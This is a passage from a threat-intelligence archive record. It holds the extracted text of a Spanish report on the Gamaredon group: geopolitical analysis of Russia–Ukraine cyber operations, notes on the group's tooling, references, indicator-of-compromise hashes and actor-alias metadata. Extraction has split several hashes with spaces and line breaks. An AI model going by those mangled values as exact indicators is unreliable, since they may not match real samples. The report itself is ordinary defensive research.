Ru­\nsia. Medzhid fue detenido y acusado de tentativa de asesinato de\nvarios Jefes milicianos pro-rusos de la zona de Donetsk. El FSB\ngestionó la detención del Medzhid y durante los interrogatorios,\nel terrorista afirmó estar contratado por el Servicio de Seguridad\nEstatal de Ucrania. Estas declaraciones han sido completamente\nnegadas por los Servicios de Seguridad ucranianos, que afirman\nno tener ningún vínculo con el DAESH. Podría ser factible que no\n\n\n-----\n\nexistiera ninguna relación entre el Servicio de Seguridad de Ucra­\nina y el Daesh, pero sin embargo, Rusia pretende transmitir este\nmensaje a nivel internacional y a nivel regional. Con esta acción\nestratégica propia de Psywar, el Kremlin desacredita plenamente\nal gobierno actual de Ucrania y puede provocar una desafección\nentre sus simpatizantes por vinculación a un grupo yihadista. Al\nprovocar una desafección dentro del partido, se incrementan las\ndisidencias dentro del mismo y pierde consistencia el actual go­\nbierno ucraniano.\n\n**Recientes ciberataques y acciones de ciberespionaje entre Ru­**\n**sia, Ucrania y países de la OTAN.**\nRusia mantiene su elevado ritmo de ciberataques a organizacio­\nnes gubernamentales y compañías de diversos sectores en Ucra­\nnia. Durante el 2018 se han incrementado en un 50% los ataques.\n\nEl Kremlin ha reforzado sus recursos en la lucha radioelectrónica.\nEl Ministerio de Defensa de Rusia ha comunicado en 2018 que ha\nemprendido un proyecto, que se llevará a cabo en 2019, para es­\ntablecer trece complejos Samarkand por toda Rusia, Kaliningrado\ny Bielorrusia y que tiene como objetivo neutralizar las comunica­\nciones de cualquier recurso tecnológico militar con operativida­\ndes basadas en radiofrecuencia, lo que neutralizaría una elevada\ncantidad de operaciones militares. A nivel Europeo, durante 2018\nRusia ha intentado atacar cibernéticamente a través de su propia\nwifi a la OPAQ (OPCW), organización vinculada a Gran Bretaña en\n\n\nel análisis de las sustancias usadas por Rusia en el caso Skripal.\nLa OPAQ también ha estado vinculada a la denuncia del uso ilegal\nde las armas químicas del socio de Rusia, Bashar Al Assad, he­\nchos que inducen a pensar en que la OPAQ es una organización\ndentro del target represivo del Kremlin.\n\nDesde 2014 Ucrania ha contabilizado un exponencial aumento de\nciberataques provenientes de Rusia a organizaciones guberna­\nmentales y empresas del sector privado, sobre todo pertenecien­\ntes al sector energético. Los Ministerios de Ucrania han llegado\na recibir hasta 6.500 ciberataques en un período reducido de dos\nmeses. Según informó Europapress, durante 2017 se produjeron\nvarios ciberataques que inhabilitaron el metro de Kiev, el aeropuer­\nto Boryspil de Kiev, la importante empresa Antonov (fabricante de\naviones), el Banco Central Ucraniano e incluso la Central Nuclear\nde Chernóbil fue infectada cibernéticamente en uno de los ata­\nques supuestamente perpetrados por el Kremlin; de algunos de\nestos ataques se ha responsabilizado directamente al GRU, el ser­\nvicio de inteligencia militar ruso.\n\n\n-----\n\n1. La internacionalización del conflicto ruso-ucraniano ha\n\ninvolucrado a grandes organizaciones mundiales como la\nOTAN que ha emprendido un proyecto de disuasión dirigido\nhacia el Kremlin con el “Trident Project”. La OTAN pretende\nfrenar la persistente ocupación de Rusia dentro de Crimea.\nLa sede de la OTAN en Kiev es uno de los principales targets\nde Gamaredon y es probable que actualmente esté infec­\ntada.\n\n2. Los conflictos dentro de la zona fronteriza con Rusia de\n\nDonetsk se están incrementando, y consecuentemente el\nKremlin pretende generar una franja de seguridad dirigida\nhacia la OTAN formada entre países exsoviéticos como\nBielorrusia y Ucrania. Este hecho implica que las comuni­\ncaciones entre las embajadas ubicadas en Kiev sean un\nimportante target del mismo Kremlin y consecuentemente\nde Gamaredon.\n\n3. La sociedad ucraniana sufre de forma consistente y regular\n\ninestabilidad en varios aspectos. Desde el Kremlin se pro­\nmueven todos estos desequilibrios con el fin de debilitar a\nla sociedad ucraniana nacionalista y anti-rusa. La parte de\n\n\nla sociedad ucraniana que es defensora del partido nacio­\nnalista empieza a sentir desesperanza y agotamiento psi­\ncosocial por el conflicto armado. Desde el Kremlin se ha\niniciado una fuerte campaña de apoyo a los candidatos a la\nPresidencia de 2019 pro-rusos, Yuriy Boyko y Vadim Ravin­\nbovich. La campaña está fundamentada en mensajes para\nreestablecer la paz en el país. El Kremlin pretende enviar el\nmensaje a la sociedad ucraniana de que si el nuevo gobier­\nno en 2019 es de corte pro-ruso, los rebeldes de la zona de\nDonetsk cederán sus revueltas.\n\n4. El actual gobierno de Ucrania está llevando a cabo políticas\n\ncontra la cultura pro-rusa dentro de Ucrania. Esto se debe\na la desconexión cultural que desea establecer el actual\ngobierno nacionalista de Ucrania con Rusia. La religión ha\nsido una acción contra el Kremlin. El Patriarcado Ortodoxo\nde Kiev se ha desvinculado plenamente del Patriarcado de\nConstantinopla de la iglesia ortodoxa de Rusia.\n\nGamaredon basa ahora mismo su ejecución en la herramienta 7zip\ncomo su empaquetador y ficheros batch para dirigir el flujo de eje­\ncución.\n\n\n-----\n\n5. Su infraestructura sigue estando basada en dominios diná­\n\nmicos (DDNS principalmente).\n\n6. Los nombres de dominio elegidos y la ubicación de las IP\n\nde los command and control invitan a pensar que se esté\nutilizando Ucrania como un laboratorio (tal y como insinúa\n@DrunkBinary en su cuenta de Twitter). Pero a pesar de eso\nexisten víctimas reales infectadas y disponen de una botnet\nextensa.\n\n7. Por lo publicado recientemente por el CERT de Ucrania una\n\nde las vías de infección es el correo electrónico. Aun así\ndesde S2 Grupo se ha visto que los metadatos están todos\nrelacionados con la herramienta CryptoPro CSP y además\nlas ubicaciones de los ficheros todas están ligadas a una\nherramienta criptográfica, por lo que no se debería descar­\ntar que los atacantes estén utilizando este software como\nun señuelo o gancho.\n\n\n-----\n\n- Antonio Esteban, A. E. (2014a). OTAN: El oso y las hienas.\n\nMadrid, España: IEEE. Antonio Esteban, A. E. (2014b). La\nsecesión en el derecho internacional: El caso de Crimea.\nMadrid, España: IEEE.\n\n- APM MAP. (s.f.). APTMAP. https://aptmap.netlify.com/\n\n- El Periódico. (2018, 8 noviembre). https://www.elperiodico.\n\ncom/es/internacional/20181104/rusia-asfixia-los-puertosde-ucrania-tras-la-apertura-del-puente-de-crimea-7098712\n\n- France 24. (2018, 14 octubre).https://www.france24.com/\n\nes/20181013-iglesia-ucrania-rusia-separacion-ortodoxos\n\n- Francisco Ruiz, F. R. (2012). UCRANIA: ¿RUMBO HACIA LA\n\nUE, HACIA RUSIA, O HACIA LA RUPTURA? Madrid, España:\nIEEE.\n\n- Franklin Kramer, F. K. (2014). NATO PRIORITIES. Madrid, Es­\n\npaña: Atlantic Council.\n\n- Gregorio Álvarez, G. A. (2014). LOS FACTORES DE RIESGO\n\n\nECONÓMICO EN LA CRISIS DE UCRANIA. Madrid, España:\nIEEE.\n\n- Instituto de Estrategia S.L.P. (2017, 7 diciembre). Sanciones\n\nde Rusia y Crimea. http://www.institutodeestrategia.com/\narticulo/eurasia/estados-unidos-mantendra-sanciones-ru­\nsia-crimea-reincorpore-ucrania/20171207184331008848.\nhtml\n\n- Instituto de Estrategia S.L.P. (2018, 16 septiembre). Bom­\n\nbardeo de Lugansk. http://www.institutodeestrategia.com/\narticulo/eurasia/tropas-ucranianas-rompen-tregua-bom­\nbardean-lugansk/20180916141943016329.html\n\n- Instituto de Estrategia S.L.P. (2018b, 5 febrero).\n\n- ¿Qué tienen en común Ucrania, Siria y Venezuela?\n\nhttp://www.institutodeestrategia.com/articulo/in­\nternacional/tienen-comun-ucrania-siria-venezue­\nla/20180205105920010359.html\n\n- Instituto de Estrategia S.L.P.: Rusia y la franja de defensa:\n\n\n-----\n\n- http://www.institutodeestrategia.com/articulo/eurasia/ru­\n\nsia-alega-construira-franja-defensa-geoegia-ucraina-en­\ntran-otan/20181029163732017831.html\n\n- LookingGlass. (2015). Operation Armageddon: Cyber Espio­\n\nnage as a Strategic Component of Russian Modern Warfare.\nY, US: Threat Intelligence Group.\n\n- New Front. (2018, 1 noviembre). El sistema de guerra elec­\n\ntrónica de Rusia »Samarkand», puede paralizar fácilmente al\nejército de la OTAN. https://es.news-front.info/2018/11/01/\nel-sistema-de-guerra-electronica-de-rusia-samar­\nkand-puede-paralizar-facilmente-al-ejercito-de-la-otan/\n\n- Olexiy Minakov, O. M. (2018, 17 noviembre). Deep Dive:\n\nhttp://www.atlanticcouncil.org/blogs/ukrainealert/deep-di­\nve-how-ukraine-s-presidential-candidates-plan-to-win\n\n- Palo Alto Network. (2017, 27 febrero). The Gamaredon Group\n\nToolset Evolution Blog. https://researchcenter.paloaltone­\ntworks.com/2017/02/unit-42-title-gamaredon-group-tool­\nset-evolution/\n\n- Pedro Sánchez, P. S. (2014). CRIMEA: ¿UNA NUEVA “POSI­\n\nCIÓN AVANZADA” RUSA?. Madrid, España: IEEE.\n\n\n\n- Share America. (2018, 5 noviembre). Attention Required! |\n\nCloudflare. https://share.america.gov/es/31-paises-uni­\ndos-en-el-ejercicio-trident-juncture-de-la-otan/\n\n- SLAVYANGRAD. (2015, 13 noviembre). La guerra del gas.\n\nhttps://slavyangrad.es/2015/11/13/la-guerra-del-gas/\n\n- Sputnik. (2017, 10 agosto). Rapid Trident 2017: Ucrania\n\nsacará músculo ante la OTAN. https://mundo.sputnik­\nnews.com/defensa/201708101071478756-defensa-euro­\npa-kiev-maniobras/\n\n- Sputnik. (2018, 14 septiembre). Los ejercicios internacio­\n\nnales Rapid Trident Ucrania.https://mundo.sputniknews.\ncom/defensa/201809141082003092-ejercicios-interna­\ncionales-rapid-trident-concluyen-ucrania/\n\n- Últimas noticias del CERT de Ucrania relacionadas con el\n\ngrupo Gamaredon https://cert.gov.ua/news/46\n\n\n-----\n\n**A. INDICADORES DE COMPROMISO**\n\n\n-----\n\nb77223508a9cfbd70b2\n\n889503dce4000fab59de81895cfc7ae15362344cd9729cf1ebd­\n822f116ea81de\n\n8d3fbf070fa48e5352c106173803d1952bd6324879b87cc12cd­\ndd2ae78b1cd2b\n\n928aa3d3e26e9e285ccaf0b0132b92d2711de3a9f5d­\n58244934854d02a529f70\n\n9897da7d569172c6cda55e240da8e4a72b66fbe73b4ba­\nf72688324086e254902\n\n9fc5081ba3c1a4473ac1ffa3d653096afa16684a3e­\n819ce6745bc22d38bb97f9\n\na0fde3e30e290fdf57816cdb38e28f1f1cfa82d21d­\nfe1967566792e62c2a3b07\n\na1677309250426d159b2fae1ece4fff98d8780d1391923eb­\nc092ac9eb65c266b\n\nadf3a16766de2adcb2092b3cbd3a6ba600e2490d02b703dd­\nb0583a46508408c2\n\nb845c5b3ae6ad883148eceb51cae8a227267cc6f5dfd28ebe­\n863b3bb073a45fb\n\nb a 5 f 2 2 3 1 4 2 5 3 d 0 8 e 5 c 2 6 e e 5 9 5 e f 3 6 9 b 9 7 1 5 d e ­\nb66483123a893581c00c5083a41\n\nc9552ebe70faa0f8b034280033516f79fa61494628ba6ffb­\nc1a463866ed83ba8\n\ncddd32776c4a7a32ffc4cb19ea67a614f91cf177ea7cf01fb8d­\nd6 f 5 d1f22b\n\n\n2276bf368973d\n\nd0e104ef52522e1660f7fba8252ab6eae3d2c024ccb82581e­\n16249a47740351f\n\nd 3 5 3 8 4 8 4 a 8 1 0 8 9 7 c 6 8 1 6 a 7 c a 3 0 d 9 1 f 5 a 6 b e c d a ­\nf692aa51968c9cd68373f1f008\n\nda0f8ba7fb5fa1f1427de86a3f13bce0820578c0b2eda­\n69898964d9f6d50aa7c\n\ne3d2db534cf8c18e6aaeba9ab57faa8f44dd5789ec­\n216690f42983392b6128dc\n\ne51cc55becd2974ba3c0d75246244d1312e9e11d­\n7931225d76ef449c43eac248\n\nea356e9afa8d0afe6e884924516733ee1dcf1f18057844cd9f­\nc94e3343e489a6\n\neecc285afc2cd06e0950c5806f4f62daa9bf8db577d326d5e­\n4b213660be31dc1\n\nef2043048da9a9b9e249c487894cf2c19809091ef79a72922ed­\n335064fe3663f\n\nff5ce90c78eb4d6c2714bd659fb6fbbb9afc50d03a16d32015ff­\n350d79f6fec4\n\nff75bd2dc7b3244420eff49be17d074fe570bef5dfedd37af­\n07d6872a84ed318\n\ne33456c26d161b3464acdc104271289dced8f4e5f­\n5b35786635ec111501c1405\n\nc 7 d a b 3 9 d 9 8 0 6 4 4 f 5 2 2 8 b e a 0 4 c 2 d a d c 9 7 b 5 f 3 a e ­\n8902d4410599558 8b9578 2 6\n\n\n-----\n\n-----\n\n**B. PROTOCOLO DE INTERCAMBIO**\nDescripción de cada TLP según https://www.certsi.es/tlp\n\n\n-----\n\n**MADRID** **BARCELONA** **VALENCIA**\n\nAvda de Manoteras 46 BIS 6ºC Llull, 321 Ramiro de Maeztu, 7\n28050 Madrid 08019 Barcelona 46022 Valencia\nT (34) 902 882 992 T (34) 933 030 060 T (34) 963 110 300\n\nF (34) 963 106 086\n\n**BRUSELAS** **LISBOA** **BOGOTÁ** **MÉXICO D.F.**\n\nRue Belliard, 20 Avenida do Brasil nº1 44-7, México D.F.\n1040 1749-008 Lisboa 06600\nT (32) (0) 474532974 T (351) 217 923 729 T (52) 55 2128 0681\n\n\n-----",
    "language": "ES",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://www.securityartwork.es/wp-content/uploads/2019/01/GREIN-Grupo-GAMAREDON.pdf"
    ],
    "report_names": [
        "GREIN-Grupo-GAMAREDON.pdf"
    ],
    "threat_actors": [
        {
            "id": "81bd7107-6b2d-45c9-9eea-1843d4b9b308",
            "created_at": "2022-10-25T15:50:23.320841Z",
            "updated_at": "2025-03-27T02:00:55.441723Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Gamaredon Group",
                "IRON TILDEN",
                "Primitive Bear",
                "ACTINIUM",
                "Armageddon",
                "Shuckworm",
                "DEV-0157",
                "Aqua Blizzard"
            ],
            "source_name": "MITRE:Gamaredon Group",
            "tools": [
                "QuietSieve",
                "Pteranodon",
                "PowerPunch"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c91e335e-42be-48d9-96b5-ba56749a723b",
            "created_at": "2022-10-25T16:07:23.458346Z",
            "updated_at": "2025-03-27T02:02:09.813395Z",
            "deleted_at": null,
            "main_name": "CIA",
            "aliases": [
                "Central Intelligence Agency"
            ],
            "source_name": "ETDA:CIA",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d5156b55-5d7d-4fb2-836f-861d2e868147",
            "created_at": "2023-01-06T13:46:38.557326Z",
            "updated_at": "2025-03-27T02:00:02.861124Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Aqua Blizzard",
                "Actinium",
                "DEV-0157",
                "Blue Otso",
                "G0047",
                "PRIMITIVE BEAR",
                "Shuckworm",
                "Trident Ursa",
                "UAC-0010",
                "Winterflounder",
                "ACTINIUM",
                "BlueAlpha",
                "IRON TILDEN"
            ],
            "source_name": "MISPGALAXY:Gamaredon Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "61940e18-8f90-4ecc-bc06-416c54bc60f9",
            "created_at": "2022-10-25T16:07:23.659529Z",
            "updated_at": "2025-03-27T02:02:09.912404Z",
            "deleted_at": null,
            "main_name": "Gamaredon Group",
            "aliases": [
                "Actinium",
                "Aqua Blizzard",
                "Armageddon",
                "Blue Otso",
                "BlueAlpha",
                "Callisto",
                "DEV-0157",
                "Iron Tilden",
                "Operation STEADY#URSA",
                "Primitive Bear",
                "SectorC08",
                "Shuckworm",
                "Trident Ursa",
                "UAC-0010",
                "Winterflounder"
            ],
            "source_name": "ETDA:Gamaredon Group",
            "tools": [
                "Aversome infector",
                "BoneSpy",
                "DessertDown",
                "DilongTrash",
                "DinoTrain",
                "EvilGnome",
                "FRAUDROP",
                "Gamaredon",
                "GammaDrop",
                "GammaLoad",
                "GammaSteel",
                "Gussdoor",
                "ObfuBerry",
                "ObfuMerry",
                "PlainGnome",
                "PowerPunch",
                "Pteranodon",
                "Pterodo",
                "QuietSieve",
                "Remote Manipulator System",
                "Resetter",
                "RuRAT",
                "SUBTLE-PAWS",
                "UltraVNC"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "236a8303-bf12-4787-b6d0-549b44271a19",
            "created_at": "2024-06-04T02:03:07.966137Z",
            "updated_at": "2025-03-27T02:05:17.410356Z",
            "deleted_at": null,
            "main_name": "IRON TILDEN",
            "aliases": [
                "Aqua Blizzard ",
                "Armageddon",
                "Blue Otso ",
                "BlueAlpha ",
                "Dancing Salome ",
                "Gamaredon",
                "Gamaredon Group",
                "Hive0051 ",
                "Primitive Bear ",
                "Shuckworm ",
                "Trident Ursa ",
                "UAC-0010 ",
                "UNC530 ",
                "WinterFlounder ",
                "ACTINIUM "
            ],
            "source_name": "Secureworks:IRON TILDEN",
            "tools": [
                "Pterodo"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041637,
    "ts_creation_date": 1546945655,
    "ts_modification_date": 1546945657,
    "files": {
        "pdf": "https://archive.orkl.eu/c4209e9de8f50528d4b6c72d36f319a684121a9f.pdf",
        "text": "https://archive.orkl.eu/c4209e9de8f50528d4b6c72d36f319a684121a9f.txt",
        "img": "https://archive.orkl.eu/c4209e9de8f50528d4b6c72d36f319a684121a9f.jpg"
    }
}